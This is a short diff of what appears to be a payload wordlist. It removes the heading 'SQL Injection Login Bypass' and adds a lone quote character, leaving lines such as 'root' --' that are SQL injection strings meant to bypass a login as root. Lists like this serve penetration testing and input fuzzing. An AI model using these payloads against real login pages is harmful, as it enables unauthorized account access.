@@ -1,5 +1,4 @@
-SQL Injection Login Bypass 
-
+'
 root' --
 root' #
 root'/*
